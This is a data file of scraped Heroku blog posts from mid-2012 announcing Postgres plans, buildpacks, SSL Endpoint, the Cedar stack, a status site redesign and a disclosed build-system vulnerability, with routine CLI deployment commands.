{"website": "Heroku", "title": "Crane: Heroku's new $50 per month production database  ", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/crane_the_new_50_per_month_production_database_", "abstract": "Crane: Heroku's new $50 per month production database Posted by Matthew Soldo May 08, 2012 Listen to this article Last week we launched our dev plan , a free database designed for development and testing. Today, we are launching into public beta two new plans: Crane and Kappa. These plans are part of our production tier, offering the same monitoring, operations, support, and data protection features as our more expensive plans. Crane is available for $50 per month and features a 400 mb cache. Kappa is $100 per month and features a 800 mb cache. They can be provisioned immediately via the Heroku Postgres website or via our command line tool: $ heroku addons:add heroku-postgresql:crane Use Cases Crane and Kappa make Heroku Postgres' fully managed database service available to a much wider audience. They deliver on the promise of cloud-services, allowing apps to start small and scale-up when necessary. They benefit from the same underlying durability, monitoring, and productivity features available to every production database. What's Included Crane and Kappa support all of the features of our existing production plans: Fully managed service Fork Follow Continuous Protection Data Clips Production-Grade Monitoring and Operations Visibility through the web admin at postgres.heroku.com Automatic daily snapshots Direct access with psql, libpq, or ODBC clients Hardened security Beta Period As beta services, Crane and Kappa are subject to decreased stability and unexpected problems. Caution should be exercised when using them for important applications. While in beta there is no charge for the plans, however they will incur charges as soon as they are released into general availability (notice will be provided to all beta users prior to GA release). Try crane or kappa out today: $ heroku addons:add heroku-postgresql:crane And please send any feedback on the plans to dod-feedback@heroku.com , @herokupostgres or file a support ticket if you encounter any difficulties. postgres", "date": "2012-05-08,"},
{"website": "Heroku", "title": "Multiple Ruby Version Support on Heroku", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/multiple_ruby_version_support_on_heroku", "abstract": "Multiple Ruby Version Support on Heroku Posted by Richard Schneeman May 09, 2012 Listen to this article Maximizing parity between development and production environments is a best practice for minimizing surprises at deployment time. The version of language VM you're using is no exception. One approach to this is to specify it using the same dependency management tool used to specify the versions of libraries your app uses. Clojure uses this technique with Leinigen , Scala with SBT , and Node.js with NPM . In each case, Heroku reads the dependency file during slug compile and uses the version of the language that you specify. Today, we're pleased to announce that we've added support for specifying a Ruby version to Gem Bundler , the dependency management tool for Ruby. This will allow you to specify a version of Ruby to be used in your Ruby app on Heroku. Try it out: $ gem install bundler --pre In your Gemfile : source 'http://rubygems.org'\n\nruby '1.9.3'\ngem  'rails', '3.2.3' Then: $ bundle install\n$ git add Gemfile\n$ git commit -m 'use Ruby 1.9.3'\n$ git push heroku master Prove that you're running 1.9.3: $ heroku run 'ruby -v'\nruby 1.9.3p194 (2012-04-20 revision 35410) [x86_64-linux]\n\n$ heroku run 'ruby -e \"puts RUBY_VERSION\"'\n1.9.3 Patch Versions While you can specify the version of Ruby for you app, you can't specify a patch version, such as Ruby 1.9.2-p290. Ruby patches often include important bug and security fixes and are extremely compatible. Heroku will provide the most secure patch level of whatever minor version number you request. Thanks Thanks to Terence Lee Heroku Ruby team member and bundler maintainer for the additional support of ruby versions to the Heroku Ruby Buildpack and orchestrated the release of Bundler 1.2.0. Also thanks to Yehuda Katz and the entire Bundler team for helping get this release out the door. ruby version", "date": "2012-05-09,"},
{"website": "Heroku", "title": "SSL Endpoint GA", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/ssl_endpoint_ga", "abstract": "SSL Endpoint GA Posted by Craig Kerstiens May 18, 2012 Listen to this article Earlier this month we released the public beta of an improved SSL solution, SSL Endpoint . We've received positive feedback from everyone using the new SSL solution. Based on this strong positive response and adoption during the beta, we're officially moving SSL Endpoint to general availability starting today.  It is now the recommended option for any app which needs SSL on a custom domain. In conjunction with SSL Endpoint's GA status, we're consolidating and simplifying our SSL product lineup by deprecating all of the older SSL add-ons: SNI, Hostname SSL, and IP SSL.  SSL Endpoint is easier to use, more robust, faster to provision, and offers more features (such as certificate rollback and client IP address as an HTTP header ). Beginning June 18, 2012, these other SSL add-ons will no longer be provisionable via heroku addons:add . Applications that already have these add-ons installed will continue to function normally, and we'll continue to fully support the SSL capabilities for those apps on an ongoing basis. For steps in migrating to the SSL Endpoint add-on please read here .", "date": "2012-05-18,"},
{"website": "Heroku", "title": "New Heroku Status Site", "author": ["Mark Pundsack"], "link": "https://blog.heroku.com/new_heroku_status_site", "abstract": "New Heroku Status Site Posted by Mark Pundsack May 22, 2012 Listen to this article Developers like you deploy code to hundreds of thousands of apps every month on the Heroku platform. Some of these are production apps which serve hundreds of millions or even billions of requests per month. Uptime of the platform is critical for such apps. We want to achieve the sustained reliability that these apps require.  But when there are incidents that impact uptime, we want to maximize our transparency and accountability to you and all developers on the platform. Today, we’re launching a completely redesigned status.heroku.com , which provides real-time status of the platform, the ability to sign up for email or SMS notification of incidents, and recent uptime history in both visual and numeric formats. Let’s zoom in on each of these points. Incident monitoring: The circles at the top show green (all systems go), yellow (intermittent errors or partial impact), or red (major outage of specified component). The boxes below describe the incident in detail and show how long it’s been happening. This page uses Pusher to refresh the page automatically as we post updates, without requiring you to continually reload to track progress of an in-progress incident. Proactive Alerts: Click “Subscribe to Notifications” in the upper right corner to receive notifications on platform incidents in a variety of formats: email, SMS, Twitter, or RSS. Uptime numbers for the last month: At the top, you’ll see uptime numbers for the previous month. This provides an at-a-glance answer to the question of “How stable has Heroku been lately?” Our numbers here haven’t been as good as we’d like in the last few months, but by posting them publicly here we intend to create the transparency and accountability that will help drive us to improve. After all, you make what you measure . Timeline: Most status sites, including the previous implementation of the Heroku status site, list incidents in a blog-like format. For the new Heroku status site, we took the opportunity to try something more innovative, and the result was the timeline view. Incidents are displayed on a vertical timeline. When the platform is performing normally, the timeline is green. When an incident occurs, a red or yellow bar sized to the duration of the incident is plotted against the timeline. By scrolling down the timeline, you can get a feel for the duration and frequency of recent incidents, without needing to scrutinize each one individually. Production vs Development: There are two circles for status, two uptime numbers, and two timelines. Why the separation? Heroku’s operational efforts always prioritize continuity of service for existing production applications over service for development/prototype/hobby apps, or the ability to take development actions (such as deploying new code) against production apps. If you can’t push code to your app for ten minutes, it’s an annoyance. If your production app stops serving traffic to your users for ten minutes, that’s a much bigger problem. Today, production apps are defined as any app running two or more dynos with a production-grade database. API: Like other parts of the Heroku platform, the new status site has its own API . Use this to create a custom monitoring tool, your own front-end, or whatever you like. Documentation can be found in the Dev Center . This new status site is more than just eye candy: we’ve provided transparency and demonstrated our accountability for the uptime of the Heroku platform. It’s our goal to earn a long-term track record of reliability, one that is deserving of the critical production apps which many of you have entrusted us with. We’d like to extend a big thank-you to the approximately 350 people who helped us beta test the new status site. If you’d like to help us test future beta releases of Heroku products, sign up for our private beta list . status design uptime", "date": "2012-05-22,"},
{"website": "Heroku", "title": "Cedar Goes GA", "author": ["Keith Rarick"], "link": "https://blog.heroku.com/cedar_goes_ga", "abstract": "Cedar Goes GA Posted by Keith Rarick May 24, 2012 Listen to this article As of today, the Cedar stack is now in general availability. Cedar features a streamlined HTTP stack allowing for advanced HTTP capabilities, heroku run for execution of arbitrary one-off dynos , Procfile and the process model for execution of any type of worker process.  Most importantly, Cedar is a polyglot platform with official support for Clojure, Java, Node.js, Python, Ruby, and Scala, and extensibility for unlimited others via buildpacks . The Dev Center team has spent the last few months “Cedar-izing” our developer documentation, so now most articles describe use of Heroku on the Cedar platform.  ( Aspen and Bamboo remain documented in their own section.) Cedar is the most powerful, performant, and reliable of the three Heroku runtime stacks. In a few weeks, we'll be making it the default. But don't wait for that; even in the meantime we recommend using heroku create --stack cedar for all new apps, especially those in production. If you have applications under active development running on Aspen or Bamboo, we recommend migrating to Cedar .", "date": "2012-05-24,"},
{"website": "Heroku", "title": "Cedar is the Default Heroku Stack", "author": ["Keith Rarick"], "link": "https://blog.heroku.com/cedar_is_the_default_heroku_stack", "abstract": "Cedar is the Default Heroku Stack Posted by Keith Rarick June 20, 2012 Listen to this article The Heroku Cedar stack went public beta last year with a series of blog posts .  Since then, over 80,000 developers have deployed over 4.5 million times, to apps written in dozens of different programming languages and frameworks.  Today, over 75 percent of Heroku app development activity is on the Cedar stack. Production apps like Banjo , Rapportive , PageLever , do.com , and Project Zebra run on Cedar; some of these serve hundreds of millions or even billions of requests per month. Cedar features a streamlined HTTP stack allowing for advanced HTTP capabilities, heroku run for execution of arbitrary one-off dynos , Procfile and the process model for execution of any type of worker process.  Most importantly, Cedar is a polyglot platform with official support for Clojure, Java, Node.js, Python, Ruby, and Scala, and extensibility for unlimited others via buildpacks . You can still create applications on one of our other stacks using heroku create --stack , but we recommend Cedar for all new apps. If you have applications under active development running on Aspen or Bamboo, we recommend migrating to Cedar .", "date": "2012-06-20,"},
{"website": "Heroku", "title": "Codon Security Issue and Response", "author": ["Byron Sebastian"], "link": "https://blog.heroku.com/codon_security_issue_and_response", "abstract": "Codon Security Issue and Response Posted by Byron Sebastian July 03, 2012 Listen to this article Heroku learned of and resolved a security vulnerability last week. We want to report this to you, describe how we responded to the incident, and reiterate our commitment to constantly improving the security and integrity of your data and source code. On Tuesday, June 26, Jonathan Rudenberg notified us about an issue in our Codon build system. The Codon build system is responsible for receiving application code from Git and preparing it for execution on the Aspen and Cedar stacks. This vulnerability exposed a number of sensitive credentials which could be used to obtain data and source code of customer applications.  Upon receiving notification we rolled the most sensitive credentials. An initial patch was in place within 24 hours.  The final patch was deployed to production after thorough testing the morning of Friday, June 29. That same morning all relevant credentials were rotated. Subsequent to this patch, we conducted a thorough and comprehensive audit of our internal logs.  We found no evidence that these credentials were used to obtain customer data or credentials, either by Jonathan or any third parties. We would like to thank Jonathan for notifying us of this vulnerability last week, and giving us ample opportunity to fix it. He provides his description of events on his blog at http://titanous.com/posts/vulnerabilities-in-heroku-build-system We are confident in the steps we took to protect our customers from this vulnerability and are redoubling our efforts to provide you with the most secure cloud platform available.  We would also like to reaffirm our commitment to the security and integrity of our customer's data and code. Nothing is more important to us.", "date": "2012-07-03,"},
{"website": "Heroku", "title": "Heroku Postgres Basic Plan and Row Limits", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/heroku_postgres_basic_plan_and_row_limits", "abstract": "Heroku Postgres Basic Plan and Row Limits Posted by Matthew Soldo July 16, 2012 Listen to this article Today, the Heroku Postgres team released into beta the new basic plan , $9 / month version of the free dev plan . Accompanying this announcement is the implementation of a 10,000 row limit on the dev plan. This row limit was designed to correspond to the 5mb limit on the existing free shared plan. Please note that these plans are still beta, and Heroku Postgres has not yet announced a migration schedule from the shared plan. However you can start using these plans today. Read more about the new plan, and the mechanics of the row limits on the Heroku Postgres Blog .", "date": "2012-07-16,"},
{"website": "Heroku", "title": "Ten Million Rows for Under Ten Bucks", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/row_limits_for_dev_plan_and_introducing_the_basic_plan_", "abstract": "Ten Million Rows for Under Ten Bucks Posted by Matthew Soldo July 16, 2012 Listen to this article Six weeks ago we launched into beta the Heroku Postgres dev plan , a free,\npostgres 9.1 plan that offers many of the features of our production tier service. Over\n3,000 of these dev databases are in active use, and it has been operating\nexceptionally well. When we launched the dev plan, we wrote that the plan would be limited based\non rows rather than physical byte size. Today we are implementing a 10,000 row\nlimit for the dev plan. This limit was chosen to correspond to the 5mb limit\non the existing, shared database service. Over 98% of the active shared\ndatabases that are under 5mb are also under the 10,000 row limit. Introducing the Basic Plan If you need more than 10,000 rows, you can upgrade to the production tier crane plan ($50 / mo), or upgrade to the new new basic plan , available today. Basic is identical to dev except that it has a 10 million row limit. The basic plan\nwill be available for $9 / month when it exits beta. We expect the beta period\nfor basic to be brief, so it should be provisioned only if you intend to\npurchase it. Understanding Row Limits The dev and basic database plans are both row limited. In order to ensure that\nthe row limits do not disrupt application operation, we have developed the\nfollowing mechanism for enforcement: When your database is at 70% of its row capacity, the owner receives a warning e-mail. When the database exceeds its row capacity, the owner will receive an additional notification. At this point, the database will receive a 24-hour grace period to either reduce the number of records, or migrate to another plan. If the number of rows still exceeds the plan capacity after 24 hours, INSERT privileges will be revoked on the database. Data can still be read, updated or deleted from database. This ensures that users still have the ability to bring their database into compliance, and retain access to their data. Once the number of rows is again in compliance with the plan limit, INSERT privileges are automatically restored to the database. Note that the database sizes are checked asynchronously, so it may take a few minutes for the privileges to be restored. The Future The dev and basic plans are a big leap forward from the current shared database offering.\nBy leveraging the infrastructure of our production tier plans , we've built a powerful, low-cost\ndatabase service that is accesible to a wide audience of developers. We encourage all of our users to start using the dev plan by default for all new apps. Simply enable the Heroku Labs feature flag: $ heroku labs:enable default-heroku-postgresql-dev Please read more about this flag on this Dev Center article . You can also provision a database through the Heroku add-ons catalog or standalone service today. postgres", "date": "2012-07-16,"},
{"website": "Heroku", "title": "Buildpacks: Heroku for Everything", "author": ["Matthew Manning"], "link": "https://blog.heroku.com/buildpacks", "abstract": "Buildpacks: Heroku for Everything Posted by Matthew Manning July 17, 2012 Listen to this article Last summer, Heroku became a polyglot platform , with official support for Ruby , Node.js , Clojure , Java , Python , and Scala . Building a platform that works equally well for such a wide variety of programming languages was a unique technical design challenge. siloed products would be a non-scalable design We knew from the outset that maintaining siloed, language-specific products – a Heroku for Ruby, a Heroku for Node.js, a Heroku for Clojure, and so on – wouldn't be scalable over the long-term. Instead, we created Cedar : a single, general-purpose stack with no native support for any language.  Adding support for any language is a matter of layering on a build-time adapter that can compile an app written in a particular language or framework into an executable that can run on the universal runtime provided by Cedar.  We call this adapter a buildpack . build-time language adapters support a single runtime stack An Example: Ruby on Rails If you've deployed any app to the Cedar stack, then you've already used at least one buildpack, since the buildpack is what executes during git push heroku master . Let's explore the Ruby buildpack by looking at the terminal output that results when deploying a Rails 3.2 app: $ git push heroku master\nCounting objects: 67, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (53/53), done.\nWriting objects: 100% (67/67), 26.33 KiB, done.\nTotal 67 (delta 5), reused 0 (delta 0)\n\n-----> Heroku receiving push\n-----> Ruby/Rails app detected\n-----> Installing dependencies using Bundler version 1.2.0.pre\n       Running: bundle install --without development:test --path vendor/bundle --binstubs bin/ --deployment\n       Fetching gem metadata from https://rubygems.org/.......\n       Installing rake (0.9.2.2)\n       ...\n       Your bundle is complete! It was installed into ./vendor/bundle\n-----> Writing config/database.yml to read from DATABASE_URL\n-----> Preparing app for Rails asset pipeline\n       Running: rake assets:precompile\n       Asset precompilation completed (16.16s)\n-----> Rails plugin injection\n       Injecting rails_log_stdout\n       Injecting rails3_serve_static_assets\n-----> Discovering process types\n       Procfile declares types      -> (none)\n       Default types for Ruby/Rails -> console, rake, web, worker\n-----> Compiled slug size is 9.6MB\n-----> Launching... done, v4\n       http://chutoriaru.herokuapp.com deployed to Heroku\n\nTo git@heroku.com:chutoriaru.git\n * [new branch]      master -> master Everything that happens between Heroku receiving push and Compiled slug size is 9.6MB is part of the buildpack.  In order: installing Ruby , installing and running Bundler to manage gem dependencies, injecting database configuration , compiling Rails assets , and installing Heroku-specific plugins for logging and serving static assets. The slug that results from this Rails-specific build process can now be booted on our language-agnostic dyno manifold alongside Python, Java, and many other types of applications. Using a Custom Buildpack In the example above, the appropriate buildpack was automatically detected from our list of Heroku-maintained defaults . However, you can also specify your desired buildpack using arguments to the heroku create command or by setting the BUILDPACK_URL config variable. This enables the use of custom buildpacks. If you want to run your Rails app on JRuby, for example, specify the buildpack created by the JRuby team at app creation time: $ heroku create --buildpack https://github.com/jruby/heroku-buildpack-jruby Arbitrary Language Support Since language support can be completely contained inside a buildpack, it is possible to deploy an app written in nearly any language to Heroku . Indeed, there are a variety of third-party buildpacks already available: Perl by Lincoln Stoll Common Lisp by Mike Travers Go by Keith Rarick Dart by Ilya Grigorik Null by Ryan Smith See the full list of third party buildpacks in the Dev Center. Customizing the Build Process In addition to enabling new language support, the ability to select a buildpack allows you to modify the previously closed Heroku build process for popular languages. For example, consider a Ruby app that needs to generate static files using Jekyll . Before buildpacks, the only solutions would have been to 1) generate the files before deployment and commit them to the repository or 2) generate the files on-the-fly at runtime. Neither of these solutions are ideal as they violate the strict separation that should be maintained between the codebase, the build stage, and the run stage. By forking the official Ruby buildpack , you could add a site generation step to your build process, putting file generation in the build stage where it belongs. All of the default buildpacks are open source , available for you to inspect, and fork to modify for your own purposes.  And if you make a change that you think would be useful to others, please submit an upstream pull request! Adding Binary Support Your app might depend on binaries such as language VMs or extensions that are not present in the default runtime. If this is the case, these dependencies can be packaged into the buildpack . A good example is this fork of the default Ruby buildpack which adds library support for the couchbase gem . Vulcan is a tool to help you build binaries compatible with the 64-bit Linux architecture which dynos run on. Buildpacks Beyond Heroku Buildpacks are potentially useful in any environment, and we'd love to see their usage spread beyond the Heroku platform. Minimizing lock-in and maximizing transparency is an ongoing goal for Heroku. Using buildpacks can be a convenient way to leverage existing, open-source code to add new language and framework support to your own platform. Stackato , a platform-as-a-service by ActiveState, recently announced support for Heroku buildpacks . You can also run buildpacks on your local workstation or in a traditional server-based environment with Mason . Conclusion Get started hacking buildpacks today by forking the Hello Buildpack !  Read up on the implementation specifics laid out in the Buildpack API documentation, and join the public Buildpacks Google Group . If you make a buildpack you think would be useful and that you intend to maintain, send us an email at buildpacks@heroku.com and for potential inclusion on the third-party buildpacks page. buildpacks deployment language-support", "date": "2012-07-17,"},
{"website": "Heroku", "title": "Rotate database credentials on Heroku Postgres ", "author": ["Harold Giménez"], "link": "https://blog.heroku.com/rotate_database_credentials_on_heroku_postgres_", "abstract": "Rotate database credentials on Heroku Postgres Posted by Harold Giménez July 17, 2012 Listen to this article When was the last time you rotated your database credentials? Is it possible\nthat old colleague still has access to your data? Or perhaps they've been\naccidentally leaked in a screenshot. There are many reasons to rotate\nyour credentials regularly. We now support the ability to easily reset your database credentials, and it is\nas simple as running the following on your command line: heroku pg:credentials:rotate HEROKU_POSTGRESQL_COLOR --app your-app When you issue the above command, new credentials will be created for your\ndatabase, and we will update the related config vars on your heroku\napplication. However, on production databases (crane and up) we don't remove\nthe old credentials immediately. Instead, we wait until all connections using\nthe old credentials are dropped, and only then do we remove them. We wanted to\nmake sure that any background jobs or other workers running on your production\nenvironment aren't abruptly terminated, potentially leaving the system in an\ninconsistent state. Along with this change, we are removing credentials from the output of heroku pg:info , as we've seen that it has the most potential for \ncredential leaking. To view connection information for your Heroku Postgres\ndatabase you must simply ask by running heroku pg:credentials . Both of these commands are available on all Heroku Postgres plans ,\n from dev to mecha. Finally, please update to the latest version of the Heroku Toolbelt to take advantage of this new functionality. postgres", "date": "2012-07-17,"},
{"website": "Heroku", "title": "Postgres.app - easy development with Postgres on a Mac.", "author": ["Mattt Thompson"], "link": "https://blog.heroku.com/postgresapp_the_easiest_way_to_develop_with_postgres_on_a_mac", "abstract": "Postgres.app - easy development with Postgres on a Mac. Posted by Mattt Thompson July 19, 2012 Listen to this article Postgres.app is the easiest way to get started developing with Postgres on the Mac. Open the app, and you have a local Postgres database ready and awaiting new connections. Close the app, and the server shuts down. It is available for free download today , and will be available on the Mac App Store pending Apple's approval. Postgres.app is designed so that most common programming libraries can find and it and link to it automatically - making it the easiest way to develop against Postgres on a Mac. It comes with the most popular Postgres libraries and extensions available right \"out of the box\" including: PostGIS 2.0 - Geospatial data and search. PLV8 - JavaScript procedural language using the V8 engine. hstore - Key-value data type. Postgres.app supports Mac OS X Lion and Mountain Lion, and can be downloaded from http://postgresapp.com . It will also be available as a free download on the Mac App Store in the next couple weeks. Our primary motivation for this project was to lower the barrier of entry for using Postgres, allowing more people than ever before to try out cool features like hstore , full-text search , window functions , and geospatial querying . Another motivation for the project was to simplify achieving parity between development and production environments . The majority of active apps on Heroku use Postres, but we found that many developers use SQLite or MySQL on their local development machines. This can lead to subtle and hard-to-diagnose problems. Dev-prod parity is on of the best-practices set forth in The Twelve-Factor App and is an easy, low-cost way to enhancing developer productivity. Created by Mattt Thompson , Postgres.app is an open-source project released under the PostgreSQL License . Source code is available on GitHub . Whether you are a professional developer or just getting started, Postgres.app provides the best Postgres experience on the Mac. . postgres", "date": "2012-07-19,"},
{"website": "Heroku", "title": "Release of new database plans on August 1st", "author": ["Matt Manning"], "link": "https://blog.heroku.com/new-heroku-postgres-db-plans-released", "abstract": "Release of new database plans on August 1st Posted by Matt Manning July 26, 2012 Listen to this article We are happy to announce that our new line-up of database plans are being released on August 1st. The dev , basic , crane , and kappa plans make many of the most exciting features of our fully-managed database service available to a wider audience. They are now ready for all users. We will also begin billing for these plans as of August 1st. If you have been beta testing one of these databases and do not wish to incur charges for it going forward, please remove it immediately via the web interface or the command line: heroku addons:remove HEROKU_POSTGRESQL_COLOR --app app_name If you have been waiting to use these plans because they have been in beta, then your wait is (almost) over. They can be provisioned now by all users via the web interface or the command line: heroku addons:add heroku-postgresql:[dev | basic | crane | kappa] Starter Tier The dev plan (free) brings many of the best features of our production database plans to development users. This includes Postgres 9.1 , data clips , hstore schemaless SQL , direct psql access, support for most pg commands from the Heroku client , a web interface, support for multiple databases connected to a single application, and Continuous Protection . The dev databases are limited to 10,000 total rows . For users that need to store more data, the basic plan ($9 / month) raises the row limit to 10 million rows but does not increase availability or add any additional features. The dev and basic plans both belong to our Starter tier. These plans are designed to provide 99.5% availability and are ideal for trial, development, testing, and other basic usage. For serious production applications, we recommend using one of our Production plans, designed for 99.95% availability. Please note that these are design parameters, not SLAs, and availability can be further increased by taking advantage of followers . Production Tier With this release, the Production tier is expanded to include crane ($50 / month) and kappa ($100 / month). These will also be released on August 1st. They offer all of the same features as our other production databases at an incredible price point. These benefits include production-grade monitoring and operations, as well as support for fork , follow , auto backups , and fast changeovers / upgrades . Migration From Legacy Shared Databases For those users that are still using the legacy shared-database plan, we encourage you to upgrade as soon as possible. We will be announcing a deprecation and migration schedule for these plans shortly. We will be working to migrate all users onto these new plans, but we encourage you to move as soon as possible to enjoy the advantages of these improvements. You can also opt-in to creating the dev plan by default for all new applications by enabling the Heroku Labs flag . If for any reason the scheduled release of these plans causes hardship for your business, please open a support ticket so that we can individually address your needs.", "date": "2012-07-26,"},
{"website": "Heroku", "title": "Release of new plans on August 1st", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/release_of_new_plans_on_august_1st", "abstract": "Release of new plans on August 1st Posted by Matthew Soldo July 25, 2012 Listen to this article We are happy to announce that our new line-up of database plans are being released on August 1st. The dev , basic , crane , and kappa plans make many of the most exciting features of our fully-managed database service available to a wider audience. They are now ready for all users. We will also begin billing for these plans as of August 1st. If you have been beta testing one of these databases and do not wish to incur charges for it going forward, please remove it immediately via the web interface or the command line: heroku addons:remove HEROKU_POSTGRESQL_COLOR --app app_name If you have been waiting to use these plans because they have been in beta, then your wait is (almost) over. They can be provisioned now by all users via the web interface or the command line: heroku addons:add heroku-postgresql:[dev | basic | crane | kappa] Starter Tier The dev plan (free) brings many of the best features of our production database plans to development users. This includes Postgres 9.1 , data clips , hstore schemaless SQL , direct psql access, support for most pg commands from the Heroku client , a web interface, support for multiple databases connected to a single application, and Continuous Protection . The dev databases are limited to 10,000 total rows . For users that need to store more data, the basic plan ($9 / month) raises the row limit to 10 million rows but does not increase availability or add any additional features. The dev and basic plans both belong to our Starter tier. These plans are designed to provide 99.5% availability and are ideal for trial, development, testing, and other basic usage. For serious production applications, we recommend using one of our Production plans, designed for 99.95% availability. Please note that these are design parameters, not SLAs, and availability can be further increased by taking advantage of followers . Production Tier With this release, the Production tier is expanded to include crane ($50 / month) and kappa ($100 / month). These will also be released on August 1st. They offer all of the same features as our other production databases at an incredible price point. These benefits include production-grade monitoring and operations, as well as support for fork , follow , auto backups , and fast changeovers / upgrades . Migration From Legacy Shared Databases For those users that are still using the legacy shared-database plan, we encourage you to upgrade as soon as possible. We will be announcing a deprecation and migration schedule for these plans shortly. We will be working to migrate all users onto these new plans, but we encourage you to move as soon as possible to enjoy the advantages of these improvements. You can also opt-in to creating the dev plan by default for all new applications by enabling the Heroku Labs flag . If for any reason the scheduled release of these plans causes hardship for your business, please open a support ticket so that we can individually address your needs. postgres", "date": "2012-07-25,"},
{"website": "Heroku", "title": "New Heroku Postgres Plans GA", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/new_heroku_postgres_plans_ga", "abstract": "New Heroku Postgres Plans GA Posted by Craig Kerstiens August 01, 2012 Listen to this article In past months we've released the public beta of our dev, basic , crane and kappa plans. We've received positive feedback from everyone using the new database plans. Based on this strong positive response and adoption during the beta, we're officially moving these plans to general availability starting today. In conjunction with the GA of our starter tier , we're deprecating our shared database plans. The new dev and basic plans offer many improvements including Postgres 9.1 with schemaless SQL, data clips , direct psql access, and a web management interface . Beginning August 8, 2012, we will begin migrating shared database users over to the new starter tier. Users may control their application down time by migrating their databases ahead of August 8. For steps in migrating to the starter tier please read here . postgres", "date": "2012-08-01,"},
{"website": "Heroku", "title": "Design of the Status Site", "author": ["Mark Pundsack"], "link": "https://blog.heroku.com/design_of_the_status_site", "abstract": "Design of the Status Site Posted by Mark Pundsack August 06, 2012 Listen to this article A couple months ago, we launched a completely redesigned Heroku status site . Since design is important to us and, we think, to many of you, we're taking a break from our usual blog posts to dig into the Heroku approach to visual product design. Read on to experience the twists and turns on the way to the final design and let us know in the comments if you want to see more posts like this. The Premise For platform providers, a status site is a way to build trust with your customers, and in some cases, future customers. Heroku is no different. Our existing status site hadn't been updated in over two years and was showing its age. We took this as an opportunity to go back to basics; drafting up user personas and goals . The previous status site was designed around the persona of a Heroku user checking to see if Heroku is working this very second. We realized there is an equally\nimportant persona — a user or prospect trying to understand how reliable the platform is. Of the many things we could improve, we focused on three primary areas: Status is as much about uptime as it is downtime. We wanted to increase transparency. We needed to streamline the admin experience (which we won't show here). When it came time to start visual designs, we did some research to get a sense of existing solutions and user expectations . After some intensive brainstorming, we came up with the idea of a timeline. A timeline felt like the perfect device for what we were trying to achieve. Not only does it show downtime and uptime in proportion to one another, but it includes a really key piece of information: time to resolution. Prototype It started as just a hypothesis, and we needed to test that hypothesis with real customers as quickly as possible. It's easy to get tied down by visual design and lose focus on what really matters: the product. Instead of spending a lot of time in an image editor like Photoshop making the page look beautiful, we wanted a working prototype with real data from the get-go. Setting aside visual design and best practices, we created a simple Sinatra application using spaghetti code and inline styles, with read-only access to a live database: We tested the first pass with our customer advisory board by inviting them to do a 5-minute OpenHallway user study. It was important to set the right expectations (and context) for this survey: This prototype is not representative of final visuals. OpenHallway allowed us to capture the screen and audio of our testers and follow alongside them as they explored the site. Incidentally, our first tests had way too many questions and instructions. Eventually we converged on five simple questions: What are your first impressions? Is it clear what the page is about? Does it quickly convey the current platform status? Does the page increase or decrease your trust in Heroku? How does this site compare to the old status site? We also added keyboard shortcuts so our testers could simulate outages and scheduled maintenance ('o' and 'm' if you want to follow along). Mobile When we reviewed the OpenHallway videos, we noticed a concerning trend; several people commented that there was \"too much whitespace\". We knew we had taken a risky approach with the timeline and wanted to make sure we weren't committing too early to a design and ignoring actual user needs, so we (incorrectly) interpreted this to mean that the timeline wasn't working. In an effort to clear ourselves from an arbitrary commitment, we took a step back. Simplify the constraints. Think mobile. We asked ourselves what the status site would look like if we only had 320x480 pixels . Responsive Following this promising direction, we created a fully-responsive version that would work for iPhones, iPads, and desktops. We added a little more information in this version; and even more information as you increased screen real estate. But in all these versions, the timeline was gone. This again looked promising, but it was hardcoded and no longer using live data, so we started wiring it up to live data. Then a surprising thing happened and we realized that the site completely failed to satisfy our first goal of visually conveying uptime as well as downtime. In fact, once we had live data in there, we realized that if 3 consecutive days had something minor happen, like a single shared database server offline that affected significantly less than 1% of our users, it looked like our entire platform was down for 72 hours straight! It was so bad, we knew it didn't even deserve to go through customer validation. Hybrid In a last ditch effort to save the responsive design, we tried adding a timeline back into it. At this point, the design had all of the \"features\" we needed. It showed a simple list view if you were on an iPhone, added a timeline for anything larger, and progressively added more information as the screen widened. It seemed like a design win, and fit with our new guiding principles of mobile-first and responsive design. Besides, it was fun to resize the screen and see it change! ( Give it a try! ) There was only one problem: we didn't like it. It's hard to describe exactly why; it wasn't clear enough, the emphasis was in the wrong place, the meta data (Affected, Scale, and Duration) was supposed to add value but seemed to distract from the overall site. Design had been replaced by detail. Bezier So we took another step back. We took what we had learned so far and re-applied it to our initial gut reaction — the timeline . We added some meta information (e.g. duration), but not all of it (e.g. scale). We realized the App Operations / Tools split was very important to our users, but didn't go far enough. Too much counted as App Operations that had no impact on our paying customers, such as the unidling of 1-dyno free apps, or the free shared database offering. We thought about having one status light for each major component of our platform, such as routing or git push, but the complexity didn't add enough value. We then toyed with the idea of splitting based on Production vs Development instead, and it turned out to be such a great fit that we split the timeline into two columns to show it. By this time, we had already approached all of our customer advisory board and needed more fresh eyes to look at it, so we invited random beta users to do the OpenHallway studies. This time, the comments were different: we had a winner. We called this version bezier because we intended on having bezier curves to join the incidents with their timeline markers. We didn't get around to implementing them until later in the beta process, but when we did, it really brought the design together, simplifying a lot of hacks we put in place to handle overlapping incidents. Here's the JSFiddle sandbox we used to get the right shape for the curves. It's not exactly how we implemented it, but it's where we started, and just knowing it was feasible let us move on with the design. Beta and Release All of the designs above were intended as throwaways since they were prototypes solely designed to be validated with customers. But as sometimes happens, we got such great response from the last design, that we decided to go into beta with the design largely unchanged. We're happy with the final design ; we use it internally and even have it up on a big screen in our office. But like anything we build, this is a perpetual work-in-progress. The new status site provides more value than the previous one, but we're going to continue iterating and improving, so keep the feedback coming! status design user experience prototype", "date": "2012-08-06,"},
